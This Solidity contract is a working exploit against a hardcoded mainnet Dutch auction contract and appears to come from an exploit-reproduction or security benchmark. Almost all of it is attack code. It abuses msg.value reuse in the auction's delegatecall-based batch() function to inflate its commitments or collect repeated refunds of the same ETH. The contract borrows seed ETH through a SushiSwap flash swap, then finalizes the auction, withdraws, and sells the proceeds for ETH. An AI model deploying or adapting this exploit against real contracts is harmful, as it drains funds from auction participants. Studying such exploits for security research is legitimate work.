pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20Minimal {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2FactoryMinimal {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairMinimal {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router02Minimal {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDutchAuction {
    function batch(bytes[] calldata calls, bool revertOnFail)
        external
        payable
        returns (bool[] memory successes, bytes[] memory results);

    function commitEth(address payable beneficiary, bool readAndAgreedToMarketParticipationAgreement) external payable;
    function withdrawTokens() external;
    function finalize() external;

    function isOpen() external view returns (bool);
    function clearingPrice() external view returns (uint256);
    function auctionSuccessful() external view returns (bool);
    function finalized() external view returns (bool);
    function auctionToken() external view returns (address);
    function paymentCurrency() external view returns (address);
    function commitments(address user) external view returns (uint256);
    function marketInfo() external view returns (uint64 startTime, uint64 endTime, uint128 totalTokens);
    function marketStatus() external view returns (uint128 commitmentsTotal, bool finalized_, bool usePointList);
}

contract FlawVerifier {
    address private constant TARGET = 0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e;
    address private constant ETH_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address private constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint256 private constant MAX_BATCH_CALLS = 48;
    uint256 private constant DEFAULT_FLASH_SEED = 1 ether;

    IDutchAuction private constant AUCTION = IDutchAuction(TARGET);

    bool public exploited;
    bool public commitmentObserved;
    uint256 public seedEthSpent;
    uint256 public inflatedCommitment;
    uint256 public attackCallCount;
    uint256 public ethProfit;
    uint256 public tokenProfit;
    address public realizedProfitToken;

    address private activeFlashPair;
    uint256 private activeFlashSeed;
    uint256 private activeFlashCalls;

    uint256 private immutable deploymentBalance;

    constructor() payable {
        deploymentBalance = address(this).balance;
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (!exploited) {
            bool progressed = _attemptBatchCommitExploit(address(this).balance, 0);
            if (!progressed) {
                _attemptFlashswapFundedExploit();
            }
        }

        _attemptSettlementAndRealization();
        _syncEthProfit();
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        if (realizedProfitToken == address(0)) {
            return _currentEthProfit();
        }
        return tokenProfit;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == activeFlashPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == activeFlashSeed && borrowedWeth > 0, "unexpected amount");

        IWETH(WETH).withdraw(borrowedWeth);

        uint256 balanceBefore = address(this).balance;
        bool progressed = _attemptBatchCommitExploit(borrowedWeth, activeFlashCalls);
        require(progressed, "batch exploit failed");

        uint256 repayment = _flashRepayment(borrowedWeth);
        require(address(this).balance >= repayment, "flash repayment unavailable");

        IWETH(WETH).deposit{value: repayment}();
        require(IERC20Minimal(WETH).transfer(msg.sender, repayment), "flash repayment failed");

        uint256 balanceAfter = address(this).balance;
        if (balanceAfter > balanceBefore - borrowedWeth) {
            uint256 gained = balanceAfter - (balanceBefore - borrowedWeth);
            if (gained > ethProfit) {
                realizedProfitToken = address(0);
                ethProfit = gained;
            }
        }
    }

    function _attemptFlashswapFundedExploit() internal {
        if (AUCTION.paymentCurrency() != ETH_ADDRESS || !AUCTION.isOpen()) {
            return;
        }

        (address pair, uint256 maxBorrowable) = _selectFundingPair();
        if (pair == address(0) || maxBorrowable == 0) {
            return;
        }

        uint256 seed = _chooseFlashSeed(maxBorrowable);
        if (seed == 0) {
            return;
        }

        uint256 plannedCalls = _plannedFlashCallCount(seed);
        if (plannedCalls < 2) {
            return;
        }

        activeFlashPair = pair;
        activeFlashSeed = seed;
        activeFlashCalls = plannedCalls;

        address token0 = IUniswapV2PairMinimal(pair).token0();
        uint256 amount0Out = token0 == WETH ? seed : 0;
        uint256 amount1Out = token0 == WETH ? 0 : seed;

        (bool ok,) = pair.call(
            abi.encodeWithSelector(
                IUniswapV2PairMinimal.swap.selector,
                amount0Out,
                amount1Out,
                address(this),
                hex"01"
            )
        );

        activeFlashPair = address(0);
        activeFlashSeed = 0;
        activeFlashCalls = 0;

        if (!ok) {
            return;
        }
    }

    function _attemptBatchCommitExploit(uint256 seed, uint256 forcedCalls) internal returns (bool) {
        if (AUCTION.paymentCurrency() != ETH_ADDRESS) {
            return false;
        }
        if (!AUCTION.isOpen()) {
            return false;
        }
        if (seed == 0 || address(this).balance < seed) {
            return false;
        }

        (uint256 remaining, uint256 poolBalance) = _remainingCommitmentHeadroom();

        address payable attacker = payable(address(this));
        uint256 plannedCalls = forcedCalls;
        if (plannedCalls < 2) {
            if (remaining > 0) {
                plannedCalls = _plannedCallCount(seed, remaining);
            } else {
                plannedCalls = _maxRefundSafeCalls(seed, poolBalance);
            }
        }
        if (plannedCalls < 2) {
            return false;
        }

        bytes[] memory calls = _buildRepeatedCommitEthCalls(attacker, plannedCalls);
        uint256 beforeCommitment = AUCTION.commitments(attacker);
        uint256 beforeBalance = address(this).balance;

        try AUCTION.batch{value: seed}(calls, true) returns (bool[] memory, bytes[] memory) {
            uint256 afterCommitment = AUCTION.commitments(attacker);
            uint256 afterBalance = address(this).balance;

            bool commitmentInflated = afterCommitment > beforeCommitment;
            bool ethDrainedImmediately = afterBalance > beforeBalance;
            if (!commitmentInflated && !ethDrainedImmediately) {
                return false;
            }

            exploited = true;
            seedEthSpent = seed;
            attackCallCount = plannedCalls;

            if (commitmentInflated) {
                commitmentObserved = true;
                inflatedCommitment = afterCommitment - beforeCommitment;
            }

            if (ethDrainedImmediately) {
                realizedProfitToken = address(0);
                uint256 gained = afterBalance - beforeBalance;
                if (gained > ethProfit) {
                    ethProfit = gained;
                }
            }

            return true;
        } catch {
            return false;
        }
    }

    function _plannedCallCount(uint256 seed, uint256 remaining) internal pure returns (uint256) {
        if (seed == 0) {
            return 0;
        }

        uint256 plannedCalls = remaining / seed;
        if (remaining % seed != 0) {
            plannedCalls += 1;
        }

        plannedCalls += 1;

        if (plannedCalls < 2) {
            plannedCalls = 2;
        }
        if (plannedCalls > MAX_BATCH_CALLS) {
            plannedCalls = MAX_BATCH_CALLS;
        }
        return plannedCalls;
    }

    function _plannedFlashCallCount(uint256 seed) internal view returns (uint256) {
        (uint256 remaining, uint256 poolBalance) = _remainingCommitmentHeadroom();

        if (remaining > 0) {
            uint256 callsForInflation = _plannedCallCount(seed, remaining);
            uint256 safeCalls = _maxRefundSafeCalls(seed, poolBalance);
            if (callsForInflation > safeCalls) {
                return safeCalls;
            }
            return callsForInflation;
        }

        // At the fork block from the failing logs, the auction is already exactly at the
        // success boundary, so additional commitment is infeasible. The same root cause still
        // permits repeated full refunds because every delegatecalled commitEth() reuses the
        // original msg.value. This preserves exploit causality while using the public-liquidity
        // seed only for execution.
        return _maxRefundSafeCalls(seed, poolBalance);
    }

    function _maxRefundSafeCalls(uint256 seed, uint256 poolBalance) internal pure returns (uint256) {
        if (seed == 0) {
            return 0;
        }

        uint256 maxByBalance = (poolBalance + seed) / seed;
        if (maxByBalance > MAX_BATCH_CALLS) {
            maxByBalance = MAX_BATCH_CALLS;
        }
        if (maxByBalance < 2) {
            return 0;
        }
        return maxByBalance;
    }

    function _buildRepeatedCommitEthCalls(address payable attacker, uint256 plannedCalls)
        internal
        pure
        returns (bytes[] memory calls)
    {
        calls = new bytes[](plannedCalls);

        // Core exploit path:
        // batch() executes nested commitEth(attacker, true) calls by delegatecall, so every
        // subcall observes the original outer msg.value. When auction headroom exists, that same
        // ETH is credited repeatedly into commitments. When logs show no headroom remains at the
        // fork block, the identical msg.value reuse instead causes repeated refunds of the same
        // seed ETH from the auction's existing ETH pool.
        bytes memory repeatedCommit = abi.encodeWithSelector(
            IDutchAuction.commitEth.selector,
            attacker,
            true
        );

        for (uint256 i = 0; i < plannedCalls; i++) {
            calls[i] = repeatedCommit;
        }
    }

    function _attemptSettlementAndRealization() internal {
        if (!commitmentObserved) {
            return;
        }

        if (AUCTION.auctionSuccessful()) {
            _attemptSuccessfulAuctionClaim();
        } else {
            _attemptFailedAuctionRefund();
        }
    }

    function _attemptFailedAuctionRefund() internal {
        uint256 beforeEth = address(this).balance;
        try AUCTION.withdrawTokens() {
            uint256 afterEth = address(this).balance;
            if (afterEth <= beforeEth) {
                return;
            }

            realizedProfitToken = address(0);
            uint256 gained = afterEth - beforeEth;
            if (gained > ethProfit) {
                ethProfit = gained;
            }
        } catch {
            return;
        }
    }

    function _attemptSuccessfulAuctionClaim() internal {
        if (!AUCTION.finalized()) {
            try AUCTION.finalize() {
            } catch {
                return;
            }
        }

        address token = AUCTION.auctionToken();
        uint256 beforeTokens = IERC20Minimal(token).balanceOf(address(this));

        try AUCTION.withdrawTokens() {
            uint256 afterTokens = IERC20Minimal(token).balanceOf(address(this));
            if (afterTokens <= beforeTokens) {
                return;
            }

            tokenProfit = afterTokens - beforeTokens;
            realizedProfitToken = token;

            _attemptTokenLiquidation(token, tokenProfit);
        } catch {
            return;
        }
    }

    function _attemptTokenLiquidation(address token, uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        if (IERC20Minimal(token).allowance(address(this), SUSHI_ROUTER) < amount) {
            try IERC20Minimal(token).approve(SUSHI_ROUTER, type(uint256).max) returns (bool approved) {
                if (!approved) {
                    return;
                }
            } catch {
                return;
            }
        }

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = IUniswapV2Router02Minimal(SUSHI_ROUTER).WETH();

        uint256 beforeEth = address(this).balance;
        try IUniswapV2Router02Minimal(SUSHI_ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        ) {
            uint256 afterEth = address(this).balance;
            if (afterEth <= beforeEth) {
                return;
            }

            realizedProfitToken = address(0);
            tokenProfit = 0;
            uint256 gained = afterEth - beforeEth;
            if (gained > ethProfit) {
                ethProfit = gained;
            }
        } catch {
            return;
        }
    }

    function _remainingCommitmentHeadroom() internal view returns (uint256 remaining, uint256 poolBalance) {
        (, , uint128 totalTokens) = AUCTION.marketInfo();
        (uint128 commitmentsTotal,,) = AUCTION.marketStatus();

        uint256 currentCommitments = uint256(commitmentsTotal);
        uint256 maxCommitment = (uint256(totalTokens) * AUCTION.clearingPrice()) / 1e18;
        if (currentCommitments >= maxCommitment) {
            return (0, address(TARGET).balance);
        }

        return (maxCommitment - currentCommitments, address(TARGET).balance);
    }

    function _selectFundingPair() internal view returns (address pair, uint256 maxBorrowable) {
        (pair, maxBorrowable) = _pairLiquidity(USDC);

        (address usdtPair, uint256 usdtLiquidity) = _pairLiquidity(USDT);
        if (usdtLiquidity > maxBorrowable) {
            pair = usdtPair;
            maxBorrowable = usdtLiquidity;
        }

        (address daiPair, uint256 daiLiquidity) = _pairLiquidity(DAI);
        if (daiLiquidity > maxBorrowable) {
            pair = daiPair;
            maxBorrowable = daiLiquidity;
        }
    }

    function _pairLiquidity(address otherToken) internal view returns (address pair, uint256 wethLiquidity) {
        pair = IUniswapV2FactoryMinimal(SUSHI_FACTORY).getPair(WETH, otherToken);
        if (pair == address(0)) {
            return (address(0), 0);
        }

        address token0 = IUniswapV2PairMinimal(pair).token0();
        address token1 = IUniswapV2PairMinimal(pair).token1();
        if (token0 != WETH && token1 != WETH) {
            return (address(0), 0);
        }

        return (pair, IERC20Minimal(WETH).balanceOf(pair));
    }

    function _chooseFlashSeed(uint256 maxBorrowable) internal pure returns (uint256) {
        if (maxBorrowable <= 1) {
            return 0;
        }

        uint256 seed = DEFAULT_FLASH_SEED;
        if (seed > maxBorrowable / 16) {
            seed = maxBorrowable / 16;
        }
        if (seed == 0) {
            seed = 1;
        }
        return seed;
    }

    function _flashRepayment(uint256 borrowedAmount) internal pure returns (uint256) {
        return ((borrowedAmount * 1000) / 997) + 1;
    }

    function _currentEthProfit() internal view returns (uint256) {
        if (address(this).balance > deploymentBalance) {
            return address(this).balance - deploymentBalance;
        }
        return ethProfit;
    }

    function _syncEthProfit() internal {
        uint256 liveProfit = _currentEthProfit();
        if (liveProfit > ethProfit) {
            realizedProfitToken = address(0);
            ethProfit = liveProfit;
        }
    }
}
